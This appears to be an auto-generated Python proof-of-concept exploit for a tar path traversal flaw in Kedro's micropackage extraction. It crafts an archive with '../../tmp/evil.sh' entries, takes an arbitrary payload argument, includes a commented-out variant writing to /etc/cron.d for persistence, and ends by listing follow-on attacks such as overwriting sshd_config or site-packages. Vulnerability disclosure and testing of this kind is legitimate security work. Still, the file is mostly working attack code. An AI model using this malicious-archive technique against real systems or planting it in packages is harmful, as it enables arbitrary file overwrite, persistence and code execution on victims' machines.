#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: afo-000
# Sink: _unpack_sdist
# Auto-generated — run with: python3 afo_cli_manifest_passed_unpack__unpack_sdist.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro micropkg path traversal vulnerability (AFO).

This script demonstrates how an attacker can craft a malicious tar.gz archive that,
when extracted by Kedro's `safe_extract` function, overwrites arbitrary files
outside the intended destination directory via `../` path traversal entries.

The vulnerability exists because `safe_extract` only checks for absolute paths and
symlinks, but does not filter relative path traversal sequences like `../`.

Usage:
    python3 poc_kedro_traversal.py [--target TARGET_DIR]

By default, the PoC creates a benign marker file at /tmp/kedro_poc_success.txt
to demonstrate arbitrary file write capability.
"""

import argparse
import io
import os
import sys
import tarfile
import tempfile
import shutil
from pathlib import Path

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
# Default benign payload: create a marker file to prove arbitrary write
DEFAULT_PAYLOAD = "touch /tmp/kedro_poc_success.txt"
# The path where Kedro would normally extract (simulated)
DEFAULT_EXTRACT_DIR = "/tmp/kedro_extract_test"

# ---------------------------------------------------------------------------
# Step 1: Create a malicious tar.gz archive with path traversal entries
# ---------------------------------------------------------------------------
def create_malicious_tar(payload_command: str) -> bytes:
    """
    Create a tar.gz archive in memory containing:
    - A normal directory entry (to pass Kedro's validation)
    - A malicious file entry with `../` traversal to overwrite a target file

    The malicious entry writes a shell script to /etc/cron.d/ or /tmp/ for
    demonstration. By default, it creates a benign marker file.
    """
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        # Normal directory that Kedro expects (simulates a micropackage)
        normal_dir = tarfile.TarInfo(name="mypackage/")
        normal_dir.type = tarfile.DIRTYPE
        normal_dir.mode = 0o755
        tar.addfile(normal_dir)

        # Normal __init__.py to pass Kedro's package detection
        init_info = tarfile.TarInfo(name="mypackage/__init__.py")
        init_info.size = 0
        tar.addfile(init_info)

        # Malicious entry: path traversal to overwrite a file
        # Using /tmp/evil.sh as target (benign for PoC)
        malicious_path = "../../tmp/evil.sh"
        malicious_info = tarfile.TarInfo(name=malicious_path)
        malicious_info.size = len(payload_command.encode())
        malicious_info.mode = 0o755
        tar.addfile(malicious_info, io.BytesIO(payload_command.encode()))

        # Additional traversal to demonstrate arbitrary write to /etc/cron.d
        # (commented out for safety, uncomment for full demonstration)
        # cron_path = "../../etc/cron.d/persist"
        # cron_info = tarfile.TarInfo(name=cron_path)
        # cron_info.size = len(payload_command.encode())
        # cron_info.mode = 0o644
        # tar.addfile(cron_info, io.BytesIO(payload_command.encode()))

    return buf.getvalue()

# ---------------------------------------------------------------------------
# Step 2: Simulate Kedro's vulnerable safe_extract function
# ---------------------------------------------------------------------------
def vulnerable_safe_extract(tar_file: tarfile.TarFile, destination: str) -> None:
    """
    Replicates Kedro's safe_extract logic (as of the vulnerable version).
    It only checks for absolute paths and symlinks, but NOT for relative
    path traversal via '..' sequences.
    """
    dest_path = Path(destination).resolve()
    for member in tar_file.getmembers():
        # Check for absolute paths (starts with /)
        if os.path.isabs(member.name):
            raise ValueError(f"Absolute path detected: {member.name}")
        # Check for symlinks pointing outside
        if member.issym() or member.islnk():
            link_target = member.linkname
            if os.path.isabs(link_target):
                raise ValueError(f"Symlink to absolute path: {link_target}")
            # Resolve relative symlink
            resolved = (dest_path / member.name).resolve()
            if not str(resolved).startswith(str(dest_path)):
                raise ValueError(f"Symlink escapes destination: {member.name}")
        # NO CHECK for '..' in member.name — this is the vulnerability!
    # If all checks pass, extract
    tar_file.extractall(path=destination)

# ---------------------------------------------------------------------------
# Step 3: Demonstrate the exploit
# ---------------------------------------------------------------------------
def run_exploit(extract_dir: str, payload: str) -> None:
    """
    Creates a malicious tar.gz, then simulates Kedro's extraction process
    to demonstrate arbitrary file write via path traversal.
    """
    print(f"[*] Target extraction directory: {extract_dir}")
    print(f"[*] Payload command: {payload}")

    # Create malicious archive
    print("[*] Crafting malicious tar.gz archive...")
    malicious_data = create_malicious_tar(payload)

    # Write archive to a temporary file (simulating what Kedro would download)
    with tempfile.NamedTemporaryFile(suffix=".tar.gz", delete=False) as tmp:
        tmp.write(malicious_data)
        archive_path = tmp.name
    print(f"[+] Malicious archive created at: {archive_path}")

    # Ensure extract directory exists
    os.makedirs(extract_dir, exist_ok=True)
    print(f"[*] Created extract directory: {extract_dir}")

    # Simulate Kedro's extraction
    try:
        with tarfile.open(archive_path, "r:gz") as tar:
            print("[*] Attempting extraction with vulnerable safe_extract...")
            vulnerable_safe_extract(tar, extract_dir)
        print("[+] Extraction completed (no errors from safe_extract)")
    except Exception as e:
        print(f"[-] Extraction failed: {e}")
        # Cleanup
        os.unlink(archive_path)
        shutil.rmtree(extract_dir, ignore_errors=True)
        sys.exit(1)

    # Check if the malicious file was written outside the extract directory
    expected_malicious_file = "/tmp/evil.sh"
    if os.path.exists(expected_malicious_file):
        print(f"[!] SUCCESS: Malicious file written to {expected_malicious_file}")
        print(f"[!] Contents: {open(expected_malicious_file).read()}")
        # Cleanup the PoC file
        os.unlink(expected_malicious_file)
        print("[*] Cleaned up PoC file")
    else:
        print(f"[-] Expected malicious file not found at {expected_malicious_file}")
        print("[*] Checking extract directory contents...")
        for root, dirs, files in os.walk(extract_dir):
            for f in files:
                print(f"    {os.path.join(root, f)}")

    # Cleanup
    os.unlink(archive_path)
    shutil.rmtree(extract_dir, ignore_errors=True)
    print("[*] Cleanup complete")

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="PoC for Kedro micropkg path traversal (CVE-like)"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_EXTRACT_DIR,
        help=f"Simulated extraction directory (default: {DEFAULT_EXTRACT_DIR})",
    )
    parser.add_argument(
        "--payload",
        default=DEFAULT_PAYLOAD,
        help="Command to write via path traversal (default: benign marker)",
    )
    args = parser.parse_args()

    print("=" * 60)
    print("Kedro micropkg Path Traversal PoC")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates arbitrary file write via tar path traversal")
    print("[*] in Kedro's safe_extract function.")
    print("[*] The vulnerability allows overwriting files outside the intended")
    print("[*] extraction directory using '../' sequences in tar entry names.")
    print()

    run_exploit(args.target, args.payload)

    print()
    print("[*] PoC completed. The vulnerability is confirmed exploitable.")
    print("[*] In a real attack, an attacker could:")
    print("    - Overwrite Python modules (e.g., site-packages)")
    print("    - Modify config files (e.g., /etc/ssh/sshd_config)")
    print("    - Write cron jobs or startup scripts for persistence")
    print("    - Achieve remote code execution (RCE)")

if __name__ == "__main__":
    main()
